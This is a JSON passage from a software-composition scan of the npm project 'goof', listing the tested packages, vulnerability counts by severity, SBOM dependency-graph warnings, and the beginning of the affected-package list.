{
  "data": {
    "id": "1de1d2b0-f75d-4343-a059-1e5cd099312b",
    "type": "sbom_test_results",
    "attributes": {
      "sbom": {
        "format": "CycloneDX JSON"
      },
      "test_summary": {
        "tested": [
          "1-goof@1.0.1",
          "10-semver@5.7.0",
          "100-brace-expansion@1.1.11",
          "101-balanced-match@1.0.0",
          "102-concat-map@0.0.1",
          "103-path-is-absolute@1.0.1",
          "104-streamifier@0.1.1",
          "105-file-type@8.1.0",
          "106-humanize-ms@1.0.1",
          "107-ms@0.6.2",
          "108-jquery@2.2.4",
          "109-lodash@4.17.4",
          "11-uuid@3.3.2",
          "110-marked@0.3.5",
          "111-method-override@3.0.0",
          "112-debug@3.1.0",
          "113-ms@2.0.0",
          "114-vary@1.1.2",
          "115-moment@2.15.1",
          "116-mongoose@4.2.4",
          "117-async@0.9.0",
          "118-bson@0.4.23",
          "119-hooks-fixed@1.1.0",
          "12-adm-zip@0.4.11",
          "120-kareem@1.0.1",
          "121-mongodb@2.0.46",
          "122-es6-promise@2.1.1",
          "123-mongodb-core@1.2.19",
          "124-kerberos@0.0.24",
          "125-nan@2.10.0",
          "126-readable-stream@1.0.31",
          "127-core-util-is@1.0.2",
          "128-isarray@0.0.1",
          "129-string_decoder@0.10.31",
          "13-body-parser@1.9.0",
          "130-mpath@0.1.1",
          "131-mpromise@0.5.4",
          "132-mquery@1.6.3",
          "133-bluebird@2.9.26",
          "134-regexp-clone@0.0.1",
          "135-sliced@0.0.5",
          "136-muri@1.0.0",
          "137-morgan@1.10.0",
          "138-basic-auth@2.0.1",
          "139-safe-buffer@5.1.2",
          "14-bytes@1.0.0",
          "140-debug@2.6.9",
          "141-depd@2.0.0",
          "142-on-finished@2.3.0",
          "143-ee-first@1.1.1",
          "144-on-headers@1.0.2",
          "145-ms@0.7.3",
          "146-npmconf@0.0.24",
          "147-config-chain@1.1.12",
          "148-ini@1.3.5",
          "149-proto-list@1.2.4",
          "15-depd@1.0.1",
          "150-inherits@1.0.2",
          "151-ini@1.1.0",
          "152-mkdirp@0.3.5",
          "153-nopt@2.2.1",
          "154-abbrev@1.1.1",
          "155-once@1.1.1",
          "156-osenv@0.0.3",
          "157-semver@1.1.4",
          "158-optional@0.1.4",
          "159-st@0.2.4",
          "16-iconv-lite@0.4.4",
          "160-async-cache@0.1.5",
          "161-fd@0.0.3",
          "162-mime@1.2.11",
          "163-negotiator@0.2.8",
          "164-graceful-fs@1.2.3",
          "165-stream-buffers@3.0.2",
          "166-tap@5.8.0",
          "167-clean-yaml-object@0.1.0",
          "168-codecov.io@0.1.6",
          "169-request@2.42.0",
          "17-media-typer@0.3.0",
          "170-bl@0.9.5",
          "171-caseless@0.6.0",
          "172-forever-agent@0.5.2",
          "173-json-stringify-safe@5.0.1",
          "174-mime-types@1.0.2",
          "175-node-uuid@1.4.8",
          "176-qs@1.2.2",
          "177-tunnel-agent@0.4.3",
          "178-aws-sign2@0.5.0",
          "179-form-data@0.1.4",
          "18-on-finished@2.1.0",
          "180-combined-stream@0.0.7",
          "181-delayed-stream@0.0.5",
          "182-hawk@1.1.1",
          "183-boom@0.4.2",
          "184-hoek@0.9.1",
          "185-cryptiles@0.2.2",
          "186-sntp@0.2.4",
          "187-http-signature@0.10.1",
          "188-asn1@0.1.11",
          "189-assert-plus@0.1.5",
          "19-ee-first@1.0.5",
          "190-ctype@0.5.3",
          "191-oauth-sign@0.4.0",
          "192-stringstream@0.0.6",
          "193-tough-cookie@3.0.1",
          "194-ip-regex@2.1.0",
          "195-psl@1.1.31",
          "196-punycode@2.1.1",
          "197-urlgrey@0.4.0",
          "198-tape@2.3.0",
          "199-deep-equal@0.1.2",
          "2-@snyk/nodejs-runtime-agent@1.43.0",
          "20-qs@2.2.4",
          "200-defined@0.0.0",
          "201-jsonify@0.0.0",
          "202-resumer@0.0.0",
          "203-through@2.3.8",
          "204-split@0.2.10",
          "205-stream-combiner@0.0.4",
          "206-duplexer@0.1.1",
          "207-coveralls@2.13.3",
          "208-js-yaml@3.6.1",
          "209-esprima@2.7.3",
          "21-raw-body@1.3.0",
          "210-lcov-parse@0.0.10",
          "211-log-driver@1.2.5",
          "212-minimist@1.2.0",
          "213-request@2.79.0",
          "214-aws-sign2@0.6.0",
          "215-aws4@1.8.0",
          "216-caseless@0.11.0",
          "217-combined-stream@1.0.7",
          "218-delayed-stream@1.0.0",
          "219-extend@3.0.2",
          "22-type-is@1.5.7",
          "220-forever-agent@0.6.1",
          "221-form-data@2.1.4",
          "222-asynckit@0.4.0",
          "223-har-validator@2.0.6",
          "224-chalk@1.1.3",
          "225-ansi-styles@2.2.1",
          "226-escape-string-regexp@1.0.5",
          "227-has-ansi@2.0.0",
          "228-ansi-regex@2.1.1",
          "229-strip-ansi@3.0.1",
          "23-mime-types@2.0.14",
          "230-supports-color@2.0.0",
          "231-commander@2.20.0",
          "232-is-my-json-valid@2.19.0",
          "233-generate-function@2.3.1",
          "234-is-property@1.0.2",
          "235-generate-object-property@1.2.0",
          "236-is-my-ip-valid@1.0.0",
          "237-jsonpointer@4.0.1",
          "238-xtend@4.0.1",
          "239-pinkie-promise@2.0.1",
          "24-mime-db@1.12.0",
          "240-pinkie@2.0.4",
          "241-hawk@3.1.3",
          "242-boom@2.10.1",
          "243-hoek@2.16.3",
          "244-cryptiles@2.0.5",
          "245-sntp@1.0.9",
          "246-http-signature@1.1.1",
          "247-assert-plus@0.2.0",
          "248-jsprim@1.4.1",
          "249-assert-plus@1.0.0",
          "25-cfenv@1.2.2",
          "250-extsprintf@1.3.0",
          "251-json-schema@0.2.3",
          "252-verror@1.10.0",
          "253-sshpk@1.16.1",
          "254-asn1@0.2.4",
          "255-bcrypt-pbkdf@1.0.2",
          "256-tweetnacl@0.14.5",
          "257-dashdash@1.14.1",
          "258-ecc-jsbn@0.1.2",
          "259-jsbn@0.1.1",
          "26-js-yaml@3.13.1",
          "260-getpass@0.1.7",
          "261-is-typedarray@1.0.0",
          "262-isstream@0.1.2",
          "263-oauth-sign@0.8.2",
          "264-qs@6.3.2",
          "265-tough-cookie@2.3.4",
          "266-punycode@1.4.1",
          "267-deeper@2.1.0",
          "268-foreground-child@1.5.6",
          "269-cross-spawn@4.0.2",
          "27-argparse@1.0.10",
          "270-lru-cache@4.1.5",
          "271-pseudomap@1.0.2",
          "272-yallist@2.1.2",
          "273-which@1.3.1",
          "274-isexe@2.0.0",
          "275-signal-exit@3.0.2",
          "276-isexe@1.1.2",
          "277-nyc@6.6.1",
          "278-append-transform@0.4.0",
          "279-default-require-extensions@1.0.0",
          "28-sprintf-js@1.0.3",
          "280-strip-bom@2.0.0",
          "281-is-utf8@0.2.1",
          "282-arrify@1.0.1",
          "283-caching-transform@1.0.1",
          "284-md5-hex@1.3.0",
          "285-md5-o-matic@0.1.1",
          "286-mkdirp@0.5.1",
          "287-minimist@0.0.8",
          "288-write-file-atomic@1.1.4",
          "289-graceful-fs@4.1.4",
          "29-esprima@4.0.1",
          "290-imurmurhash@0.1.4",
          "291-slide@1.1.6",
          "292-convert-source-map@1.2.0",
          "293-find-cache-dir@0.1.1",
          "294-commondir@1.0.1",
          "295-pkg-dir@1.0.0",
          "296-find-up@1.1.2",
          "297-path-exists@2.1.0",
          "298-foreground-child@1.5.1",
          "299-cross-spawn-async@2.2.4",
          "3-acorn@5.7.1",
          "30-ports@1.1.0",
          "300-lru-cache@4.0.1",
          "301-yallist@2.0.0",
          "302-which@1.2.10",
          "303-signal-exit@2.1.2",
          "304-glob@7.0.3",
          "305-inflight@1.0.5",
          "306-once@1.3.3",
          "307-inherits@2.0.1",
          "308-minimatch@3.0.0",
          "309-brace-expansion@1.1.4",
          "31-underscore@1.9.1",
          "310-balanced-match@0.4.1",
          "311-path-is-absolute@1.0.0",
          "312-istanbul@0.4.3",
          "313-abbrev@1.0.7",
          "314-async@1.5.2",
          "315-escodegen@1.8.0",
          "316-esprima@2.7.2",
          "317-estraverse@1.9.3",
          "318-esutils@2.0.2",
          "319-optionator@0.8.1",
          "32-consolidate@0.14.5",
          "320-deep-is@0.1.3",
          "321-fast-levenshtein@1.1.3",
          "322-levn@0.3.0",
          "323-prelude-ls@1.1.2",
          "324-type-check@0.3.2",
          "325-wordwrap@1.0.0",
          "326-source-map@0.2.0",
          "327-amdefine@1.0.0",
          "328-fileset@0.2.1",
          "329-glob@5.0.15",
          "33-bluebird@3.5.4",
          "330-minimatch@2.0.10",
          "331-handlebars@4.0.5",
          "332-optimist@0.6.1",
          "333-minimist@0.0.10",
          "334-wordwrap@0.0.3",
          "335-source-map@0.4.4",
          "336-uglify-js@2.6.2",
          "337-async@0.2.10",
          "338-source-map@0.5.6",
          "339-uglify-to-browserify@1.0.2",
          "34-cookie-parser@1.3.3",
          "340-yargs@3.10.0",
          "341-camelcase@1.2.1",
          "342-cliui@2.1.0",
          "343-center-align@0.1.3",
          "344-align-text@0.1.4",
          "345-kind-of@3.0.3",
          "346-is-buffer@1.1.3",
          "347-longest@1.0.1",
          "348-repeat-string@1.5.4",
          "349-lazy-cache@1.0.4",
          "35-cookie@0.1.2",
          "350-right-align@0.1.3",
          "351-wordwrap@0.0.2",
          "352-decamelize@1.2.0",
          "353-window-size@0.1.0",
          "354-nopt@3.0.6",
          "355-resolve@1.1.7",
          "356-supports-color@3.1.2",
          "357-has-flag@1.0.0",
          "358-micromatch@2.3.8",
          "359-arr-diff@2.0.0",
          "36-cookie-signature@1.0.5",
          "360-arr-flatten@1.0.1",
          "361-array-unique@0.2.1",
          "362-braces@1.8.5",
          "363-expand-range@1.8.2",
          "364-fill-range@2.2.3",
          "365-is-number@2.1.0",
          "366-isobject@2.1.0",
          "367-isarray@1.0.0",
          "368-randomatic@1.1.5",
          "369-repeat-element@1.1.2",
          "37-dustjs-helpers@1.5.0",
          "370-preserve@0.2.0",
          "371-expand-brackets@0.1.5",
          "372-is-posix-bracket@0.1.1",
          "373-extglob@0.3.2",
          "374-is-extglob@1.0.0",
          "375-filename-regex@2.0.0",
          "376-is-glob@2.0.1",
          "377-normalize-path@2.0.1",
          "378-object.omit@2.0.0",
          "379-for-own@0.1.4",
          "38-dustjs-linkedin@2.6.0",
          "380-for-in@0.1.5",
          "381-is-extendable@0.1.1",
          "382-parse-glob@3.0.4",
          "383-glob-base@0.3.0",
          "384-glob-parent@2.0.0",
          "385-is-dotfile@1.0.2",
          "386-regex-cache@0.4.3",
          "387-is-equal-shallow@0.1.3",
          "388-is-primitive@2.0.0",
          "389-pkg-up@1.0.0",
          "39-cli@0.6.6",
          "390-resolve-from@2.0.0",
          "391-rimraf@2.5.2",
          "392-signal-exit@3.0.0",
          "393-spawn-wrap@1.2.3",
          "394-os-homedir@1.0.1",
          "395-test-exclude@1.1.0",
          "396-lodash.assign@4.0.9",
          "397-lodash.keys@4.0.7",
          "398-lodash.rest@4.0.3",
          "399-read-pkg-up@1.0.1",
          "4-debug@4.1.1",
          "40-exit@0.1.2",
          "400-read-pkg@1.1.0",
          "401-load-json-file@1.1.0",
          "402-parse-json@2.2.0",
          "403-error-ex@1.3.0",
          "404-is-arrayish@0.2.1",
          "405-pify@2.3.0",
          "406-normalize-package-data@2.3.5",
          "407-hosted-git-info@2.1.5",
          "408-is-builtin-module@1.0.0",
          "409-builtin-modules@1.1.1",
          "41-glob@3.2.11",
          "410-semver@5.1.0",
          "411-validate-npm-package-license@3.0.1",
          "412-spdx-correct@1.0.2",
          "413-spdx-license-ids@1.2.1",
          "414-spdx-expression-parse@1.0.2",
          "415-spdx-exceptions@1.0.4",
          "416-path-type@1.1.0",
          "417-require-main-filename@1.0.1",
          "418-yargs@4.7.1",
          "419-camelcase@3.0.0",
          "42-inherits@2.0.3",
          "420-cliui@3.2.0",
          "421-string-width@1.0.1",
          "422-code-point-at@1.0.0",
          "423-number-is-nan@1.0.0",
          "424-is-fullwidth-code-point@1.0.0",
          "425-wrap-ansi@2.0.0",
          "426-os-locale@1.4.0",
          "427-lcid@1.0.0",
          "428-invert-kv@1.0.0",
          "429-pkg-conf@1.1.3",
          "43-minimatch@0.3.0",
          "430-object-assign@4.1.0",
          "431-symbol@0.2.3",
          "432-set-blocking@1.0.0",
          "433-window-size@0.2.0",
          "434-y18n@3.2.1",
          "435-yargs-parser@2.4.0",
          "436-camelcase@2.1.1",
          "437-only-shallow@1.2.0",
          "438-opener@1.5.1",
          "439-readable-stream@2.3.6",
          "44-lru-cache@2.3.1",
          "440-process-nextick-args@2.0.0",
          "441-string_decoder@1.1.1",
          "442-util-deprecate@1.0.2",
          "443-stack-utils@0.4.0",
          "444-supports-color@1.3.1",
          "445-tap-mocha-reporter@0.0.27",
          "446-color-support@1.1.3",
          "447-diff@1.4.0",
          "448-tap-parser@1.3.2",
          "449-events-to-array@1.1.2",
          "45-sigmund@1.0.1",
          "450-unicode-length@1.0.3",
          "451-readable-stream@1.1.14",
          "452-tmatch@2.0.1",
          "453-snyk@1.290.2",
          "454-@snyk/cli-interface@2.3.0",
          "455-tslib@1.10.0",
          "456-@snyk/configstore@3.2.0-rc1",
          "457-dot-prop@5.2.0",
          "458-is-obj@2.0.0",
          "459-make-dir@1.3.0",
          "46-ejs@1.0.0",
          "460-pify@3.0.0",
          "461-unique-string@1.0.0",
          "462-crypto-random-string@1.0.0",
          "463-write-file-atomic@2.4.3",
          "464-xdg-basedir@3.0.0",
          "465-@snyk/dep-graph@1.13.1",
          "466-graphlib@2.1.8",
          "467-lodash@4.17.15",
          "468-object-hash@1.3.1",
          "469-semver@6.3.0",
          "47-ejs-locals@1.0.2",
          "470-source-map-support@0.5.16",
          "471-buffer-from@1.1.1",
          "472-source-map@0.6.1",
          "473-@snyk/gemfile@1.2.0",
          "474-@snyk/snyk-cocoapods-plugin@2.0.1",
          "475-@snyk/cli-interface@1.5.0",
          "476-@snyk/cocoapods-lockfile-parser@3.0.0",
          "477-@snyk/ruby-semver@2.0.4",
          "478-@types/js-yaml@3.12.2",
          "479-core-js@3.6.4",
          "48-ejs@0.8.8",
          "480-@snyk/update-notifier@2.5.1-rc2",
          "481-boxen@1.3.0",
          "482-ansi-align@2.0.0",
          "483-string-width@2.1.1",
          "484-is-fullwidth-code-point@2.0.0",
          "485-strip-ansi@4.0.0",
          "486-ansi-regex@3.0.0",
          "487-camelcase@4.1.0",
          "488-chalk@2.4.2",
          "489-ansi-styles@3.2.1",
          "49-errorhandler@1.2.0",
          "490-color-convert@1.9.3",
          "491-color-name@1.1.3",
          "492-supports-color@5.5.0",
          "493-has-flag@3.0.0",
          "494-cli-boxes@1.0.0",
          "495-term-size@1.2.0",
          "496-execa@0.7.0",
          "497-cross-spawn@5.1.0",
          "498-shebang-command@1.2.0",
          "499-shebang-regex@1.0.0",
          "5-ms@2.1.1",
          "50-accepts@1.1.4",
          "500-get-stream@3.0.0",
          "501-is-stream@1.1.0",
          "502-npm-run-path@2.0.2",
          "503-path-key@2.0.1",
          "504-p-finally@1.0.0",
          "505-strip-eof@1.0.0",
          "506-widest-line@2.0.1",
          "507-import-lazy@2.1.0",
          "508-is-ci@1.2.1",
          "509-ci-info@1.6.0",
          "51-negotiator@0.4.9",
          "510-is-installed-globally@0.1.0",
          "511-global-dirs@0.1.1",
          "512-is-path-inside@1.0.1",
          "513-path-is-inside@1.0.2",
          "514-is-npm@1.0.0",
          "515-latest-version@3.1.0",
          "516-package-json@4.0.1",
          "517-got@6.7.1",
          "518-create-error-class@3.0.2",
          "519-capture-stack-trace@1.0.1",
          "52-escape-html@1.0.1",
          "520-duplexer3@0.1.4",
          "521-is-redirect@1.0.0",
          "522-is-retry-allowed@1.2.0",
          "523-lowercase-keys@1.0.1",
          "524-timed-out@4.0.1",
          "525-unzip-response@2.0.1",
          "526-url-parse-lax@1.0.0",
          "527-prepend-http@1.0.4",
          "528-registry-auth-token@3.4.0",
          "529-rc@1.2.8",
          "53-express@4.12.4",
          "530-deep-extend@0.6.0",
          "531-strip-json-comments@2.0.1",
          "532-registry-url@3.1.0",
          "533-semver-diff@2.1.0",
          "534-@types/agent-base@4.2.0",
          "535-@types/events@3.0.0",
          "536-@types/node@13.7.0",
          "537-@types/restify@4.3.6",
          "538-@types/bunyan@1.8.6",
          "539-ansi-escapes@3.2.0",
          "54-accepts@1.2.13",
          "540-cli-spinner@0.2.10",
          "541-debug@3.2.6",
          "542-diff@4.0.2",
          "543-git-url-parse@11.1.2",
          "544-git-up@4.0.1",
          "545-is-ssh@1.3.1",
          "546-protocols@1.4.7",
          "547-parse-url@5.0.1",
          "548-normalize-url@3.3.0",
          "549-parse-path@4.0.1",
          "55-mime-types@2.1.23",
          "550-inquirer@6.5.2",
          "551-cli-cursor@2.1.0",
          "552-restore-cursor@2.0.0",
          "553-onetime@2.0.1",
          "554-mimic-fn@1.2.0",
          "555-cli-width@2.2.0",
          "556-external-editor@3.1.0",
          "557-chardet@0.7.0",
          "558-tmp@0.0.33",
          "559-os-tmpdir@1.0.2",
          "56-mime-db@1.39.0",
          "560-figures@2.0.0",
          "561-mute-stream@0.0.7",
          "562-run-async@2.3.0",
          "563-is-promise@2.1.0",
          "564-rxjs@6.5.4",
          "565-strip-ansi@5.2.0",
          "566-ansi-regex@4.1.0",
          "567-opn@5.5.0",
          "568-is-wsl@1.1.0",
          "569-os-name@3.1.0",
          "57-negotiator@0.5.3",
          "570-macos-release@2.3.0",
          "571-windows-release@3.2.0",
          "572-execa@1.0.0",
          "573-cross-spawn@6.0.5",
          "574-nice-try@1.0.5",
          "575-get-stream@4.1.0",
          "576-pump@3.0.0",
          "577-end-of-stream@1.4.4",
          "578-proxy-agent@3.1.1",
          "579-agent-base@4.3.0",
          "58-content-disposition@0.5.0",
          "580-es6-promisify@5.0.0",
          "581-es6-promise@4.2.8",
          "582-http-proxy-agent@2.1.0",
          "583-https-proxy-agent@3.0.1",
          "584-lru-cache@5.1.1",
          "585-yallist@3.1.1",
          "586-pac-proxy-agent@3.0.1",
          "587-get-uri@2.0.4",
          "588-data-uri-to-buffer@1.2.0",
          "589-file-uri-to-path@1.0.0",
          "59-content-type@1.0.4",
          "590-ftp@0.3.10",
          "591-xregexp@2.0.0",
          "592-readable-stream@2.3.7",
          "593-pac-resolver@3.0.0",
          "594-co@4.6.0",
          "595-degenerator@1.0.4",
          "596-ast-types@0.13.2",
          "597-escodegen@1.14.1",
          "598-estraverse@4.3.0",
          "599-esutils@2.0.3",
          "6-needle@2.3.0",
          "60-cookie-signature@1.0.6",
          "600-optionator@0.8.3",
          "601-fast-levenshtein@2.0.6",
          "602-word-wrap@1.2.3",
          "603-esprima@3.1.3",
          "604-ip@1.1.5",
          "605-netmask@1.0.6",
          "606-thunkify@2.1.2",
          "607-raw-body@2.4.1",
          "608-bytes@3.1.0",
          "609-http-errors@1.7.3",
          "61-debug@2.2.0",
          "610-depd@1.1.2",
          "611-inherits@2.0.4",
          "612-setprototypeof@1.1.1",
          "613-statuses@1.5.0",
          "614-toidentifier@1.0.0",
          "615-unpipe@1.0.0",
          "616-socks-proxy-agent@4.0.2",
          "617-agent-base@4.2.1",
          "618-socks@2.3.3",
          "619-smart-buffer@4.1.0",
          "62-ms@0.7.1",
          "620-proxy-from-env@1.0.0",
          "621-snyk-config@2.2.3",
          "622-nconf@0.10.0",
          "623-secure-keys@1.0.0",
          "624-yargs@3.32.0",
          "625-string-width@1.0.2",
          "626-code-point-at@1.1.0",
          "627-window-size@0.1.4",
          "628-snyk-docker-plugin@1.38.0",
          "629-dockerfile-ast@0.0.18",
          "63-etag@1.6.0",
          "630-vscode-languageserver-types@3.15.1",
          "631-event-loop-spinner@1.1.0",
          "632-tar-stream@2.1.0",
          "633-bl@3.0.0",
          "634-readable-stream@3.5.0",
          "635-string_decoder@1.3.0",
          "636-safe-buffer@5.2.0",
          "637-fs-constants@1.0.0",
          "638-snyk-go-plugin@1.11.1",
          "639-snyk-go-parser@1.3.1",
          "64-crc@3.2.1",
          "640-toml@3.0.0",
          "641-snyk-gradle-plugin@3.2.4",
          "642-@types/debug@4.1.5",
          "643-snyk-module@1.9.1",
          "644-hosted-git-info@2.8.5",
          "645-snyk-mvn-plugin@2.8.0",
          "646-@snyk/cli-interface@2.3.1",
          "647-needle@2.4.0",
          "648-tmp@0.1.0",
          "649-tslib@1.9.3",
          "65-finalhandler@0.3.6",
          "650-snyk-nodejs-lockfile-parser@1.17.0",
          "651-@yarnpkg/lockfile@1.1.0",
          "652-p-map@2.1.0",
          "653-snyk-nuget-plugin@1.16.0",
          "654-dotnet-deps-parser@4.9.0",
          "655-@types/xml2js@0.4.3",
          "656-xml2js@0.4.19",
          "657-xmlbuilder@9.0.7",
          "658-jszip@3.2.2",
          "659-lie@3.3.0",
          "66-on-finished@2.2.1",
          "660-immediate@3.0.6",
          "661-pako@1.0.11",
          "662-set-immediate-shim@1.0.1",
          "663-snyk-paket-parser@1.5.0",
          "664-xml2js@0.4.23",
          "665-xmlbuilder@11.0.1",
          "666-snyk-php-plugin@1.7.0",
          "667-@snyk/cli-interface@2.2.0",
          "668-@snyk/composer-lockfile-parser@1.2.0",
          "669-snyk-policy@1.13.5",
          "67-ee-first@1.1.0",
          "670-email-validator@2.0.4",
          "671-lodash.clonedeep@4.5.0",
          "672-snyk-resolve@1.0.1",
          "673-then-fs@2.0.0",
          "674-promise@7.3.1",
          "675-asap@2.0.6",
          "676-snyk-try-require@1.3.1",
          "677-snyk-python-plugin@1.17.0",
          "678-snyk-resolve-deps@4.4.0",
          "679-@types/node@6.14.9",
          "68-fresh@0.2.4",
          "680-@types/semver@5.5.0",
          "681-ansicolors@0.3.2",
          "682-lodash.assign@4.2.0",
          "683-lodash.assignin@4.2.0",
          "684-lodash.clone@4.5.0",
          "685-lodash.flatten@4.4.0",
          "686-lodash.get@4.4.2",
          "687-lodash.set@4.3.2",
          "688-snyk-tree@1.0.0",
          "689-archy@1.0.0",
          "69-merge-descriptors@1.0.0",
          "690-snyk-sbt-plugin@2.11.0",
          "691-tree-kill@1.2.2",
          "692-tempfile@2.0.0",
          "693-temp-dir@1.0.0",
          "694-wrap-ansi@5.1.0",
          "695-string-width@3.1.0",
          "696-emoji-regex@7.0.3",
          "7-iconv-lite@0.4.24",
          "70-methods@1.1.2",
          "71-parseurl@1.3.3",
          "72-path-to-regexp@0.1.3",
          "73-proxy-addr@1.0.10",
          "74-forwarded@0.1.2",
          "75-ipaddr.js@1.0.5",
          "76-qs@2.4.2",
          "77-range-parser@1.0.3",
          "78-send@0.12.3",
          "79-destroy@1.0.3",
          "8-safer-buffer@2.1.2",
          "80-mime@1.3.4",
          "81-serve-static@1.9.3",
          "82-utils-merge@1.0.0",
          "83-type-is@1.6.16",
          "84-vary@1.0.1",
          "85-express-fileupload@0.0.5",
          "86-connect-busboy@0.0.2",
          "87-busboy@0.3.1",
          "88-dicer@0.3.0",
          "89-streamsearch@0.1.2",
          "9-sax@1.2.4",
          "90-fs-extra@0.22.1",
          "91-graceful-fs@4.1.15",
          "92-jsonfile@2.4.0",
          "93-rimraf@2.6.3",
          "94-glob@7.1.3",
          "95-fs.realpath@1.0.0",
          "96-inflight@1.0.6",
          "97-once@1.4.0",
          "98-wrappy@1.0.2",
          "99-minimatch@3.0.4"
        ],
        "untested": [],
        "total_issues": 140,
        "total_license_issues": 2,
        "total_vulnerabilities": 138,
        "issues_by_severity": {
          "critical": 4,
          "high": 59,
          "medium": 68,
          "low": 9
        },
        "document_warnings": [
          "Dependency graph is invalid. It references unknown component \"463x-write-file-atomic@2.4.3\".",
          "The given SBOM contains an invalid dependency graph.",
          "Falling back on analysis without dependency graph information."
        ]
      }
    },
    "relationships": {
      "affected_pkgs": {
        "data": [
          {
            "type": "packages",
            "id": "@snyk/snyk-cocoapods-plugin@2.0.1"
          },
          {
            "type": "packages",
            "id": "acorn@5.7.1"
          },
          {
            "type": "packages",
            "id": "adm-zip@0.4.11"
          },
          {
            "type": "packages",
            "id": "ansi-regex@2.1.1"
          },
          {
            "type": "packages",
            "id": "ansi-regex@3.0.0"
          },
          {
            "type": "packages",
            "id": "ansi-regex@4.1.0"
          },
          {
            "type": "packages",
            "id": "bl@0.9.5"
          },
          {
            "type": "packages",
            "id": "bl@3.0.0"
          },
          {
            "type": "packages",
            "id": "brace-expansion@1.1.4"
          },
          {
            "type": "packages",
            "id": "braces@1.8.5"
          },
          {
            "type": "packages",
            "id": "cli@0.6.6"
          },
          {
            "type": "packages",
            "id": "debug@2.2.0"
          },
          {
            "type": "packages",
            "id": "debug@3.2.6"
          },
          {
            "type": "packages",
            "id": "debug@4.1.1"
          },
          {
            "type": "packages",
            "id": "dicer@0.3.0"
          },
          {
            "type": "packages",
            "id": "dustjs-linkedin@2.6.0"
          },
          {
            "type": "packages",
            "id": "ejs@0.8.8"
          },
          {
            "type": "packages",
            "id": "ejs@1.0.0"
          },
          {
            "type": "packages",
            "id": "express-fileupload@0.0.5"
          },
          {
            "type": "packages",
            "id": "express@4.12.4"
          },
          {
            "type": "packages",
            "id": "fresh@0.2.4"
          },
          {
            "type": "packages",
            "id": "goof@1.0.1"
          },
          {
            "type": "packages",
            "id": "got@6.7.1"
          },
          {
            "type": "packages",
            "id": "handlebars@4.0.5"
          },
          {
            "type": "packages",
            "id": "hawk@1.1.1"
          },
          {
            "type": "packages",
            "id": "hawk@3.1.3"
          },
          {
            "type": "packages",
            "id": "hoek@0.9.1"
          },
          {
            "type": "packages",
            "id": "hoek@2.16.3"
          },
          {
            "type": "packages",
            "id": "hosted-git-info@2.1.5"
          },
          {
            "type": "packages",
            "id": "hosted-git-info@2.8.5"
          },
          {
            "type": "packages",
            "id": "http-signature@0.10.1"
          },
          {
            "type": "packages",
            "id": "inflight@1.0.5"
          },
          {
            "type": "packages",
            "id": "inflight@1.0.6"
          },
          {
            "type": "packages",
            "id": "ini@1.1.0"
          },
          {
            "type": "packages",
            "id": "ini@1.3.5"
          },
          {
            "type": "packages",
            "id": "ip@1.1.5"
          },
          {
            "type": "packages",
            "id": "is-my-json-valid@2.19.0"
          },
          {
            "type": "packages",
            "id": "jquery@2.2.4"
          },
          {
            "type": "packages",
            "id": "js-yaml@3.6.1"
          },
          {
            "type": "packages",
            "id": "json-schema@0.2.3"
          },
          {
            "type": "packages",
            "id": "jsonpointer@4.0.1"
          },
          {
            "type": "packages",
            "id": "jszip@3.2.2"
          },
          {
            "type": "packages",
            "id": "kerberos@0.0.24"
          },
          {
            "type": "packages",
            "id": "lodash.set@4.3.2"
          },
          {
            "type": "packages",
            "id": "lodash@4.17.15"
          },
          {
            "type": "packages",
            "id": "lodash@4.17.4"
          },
          {
            "type": "packages",
            "id": "marked@0.3.5"
          },
          {
            "type": "packages",
            "id": "micromatch@2.3.8"
          },
          {
            "type": "packages",
            "id": "mime@1.2.11"
          },
          {
            "type": "packages",
            "id": "mime@1.3.4"
          },
          {
            "type": "packages",
            "id": "minimatch@0.3.0"
          },
          {
            "type": "packages",
            "id": "minimatch@2.0.10"
          },
          {
            "type": "packages",
            "id": "minimatch@3.0.0"
          },
          {
            "type": "packages",
            "id": "minimatch@3.0.4"
          },
          {
            "type": "packages",
            "id": "minimist@0.0.10"
          },
          {
            "type": "packages",
            "id": "minimist@0.0.8"
          },
          {
            "type": "packages",
            "id": "minimist@1.2.0"
          },
          {
            "type": "packages",
            "id": "moment@2.15.1"
          },
          {
            "type": "packages",
            "id": "mongodb@2.0.46"
          },
          {
            "type": "packages",
            "id": "mongoose@4.2.4"
          },
          {
            "type": "packages",
            "id": "mpath@0.1.1"
          },
          {
            "type": "packages",
            "id": "mquery@1.6.3"
          },
          {
            "type": "packages",
            "id": "ms@0.6.2"
          },
          {
            "type": "packages",
            "id": "ms@0.7.1"
          },
          {
            "type": "packages",
            "id": "ms@0.7.3"
          },
          {
            "type": "packages",
            "id": "nconf@0.10.0"
          },
          {
            "type": "packages",
            "id": "negotiator@0.2.8"
          },
          {
            "type": "packages",
            "id": "negotiator@0.4.9"
          },
          {
            "type": "packages",
            "id": "negotiator@0.5.3"
          },
          {
            "type": "packages",
            "id": "netmask@1.0.6"
          },
          {
            "type": "packages",
            "id": "npmconf@0.0.24"
          },
          {
            "type": "packages",
            "id": "pac-resolver@3.0.0"
          },
          {
            "type": "packages",
            "id": "parse-path@4.0.1"
          },
          {
            "type": "packages",
            "id": "parse-url@5.0.1"
          },
          {
            "type": "packages",
            "id": "qs@1.2.2"
          },
          {
            "type": "packages",
            "id": "qs@2.2.4"
          },
          {
            "type": "packages",
            "id": "qs@2.4.2"
          },
          {
            "type": "packages",
            "id": "qs@6.3.2"
          },
          {
            "type": "packages",
            "id": "request@2.42.0"
          },
          {
            "type": "packages",
            "id": "request@2.79.0"
          },
          {
            "type": "packages",
            "id": "semver@1.1.4"
          },
          {
            "type": "packages",
            "id": "semver@5.1.0"
          },
          {
            "type": "packages",
            "id": "semver@5.7.0"
          },
          {
            "type": "packages",
            "id": "semver@6.3.0"
          },
          {
            "type": "packages",
            "id": "snyk-docker-plugin@1.38.0"
          },
          {
            "type": "packages",
            "id": "snyk-go-plugin@1.11.1"
          },
          {
            "type": "packages",
            "id": "snyk-gradle-plugin@3.2.4"
          },
          {
            "type": "packages",
            "id": "snyk-mvn-plugin@2.8.0"
          },
          {
            "type": "packages",
            "id": "snyk-python-plugin@1.17.0"
          },
          {
            "type": "packages",
            "id": "snyk-sbt-plugin@2.11.0"
          },
          {
            "type": "packages",
            "id": "snyk@1.290.2"
          },
          {
            "type": "packages",
            "id": "st@0.2.4"
          },
          {
            "type": "packages",
            "id": "symbol@0.2.3"
          },
          {
            "type": "packages",
            "id": "tough-cookie@2.3.4"
          },
          {
            "type": "packages",
            "id": "tough-cookie@3.0.1"
          },
          {
            "type": "packages",
            "id": "tunnel-agent@0.4.3"
          },
          {
            "type": "packages",
